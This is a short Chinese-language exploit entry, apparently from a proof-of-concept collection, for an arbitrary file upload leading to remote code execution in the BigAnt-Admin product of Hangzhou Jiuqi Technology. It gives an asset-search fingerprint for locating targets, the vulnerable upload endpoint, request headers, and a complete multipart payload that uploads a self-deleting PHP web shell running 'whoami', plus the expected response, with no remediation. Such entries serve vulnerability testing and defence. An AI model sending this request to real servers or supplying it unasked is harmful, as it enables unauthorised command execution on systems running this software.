# 杭州九麒科技BigAnt-AdminuploadMultipleFile.html存在任意文件上传致RCE漏洞

- **系统**：杭州九麒科技　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="BigAnt-Admin"`
- **请求**：`POST /Addin/Upload/uploadMultipleFile.html HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65ety…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
------WebKitFormBoundary1zY65etyNeQDfyjX
Content-Disposition: form-data; name="file"; filename="rce.php"
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundary1zY65etyNeQDfyjX--
```
- **预期**：200　|　—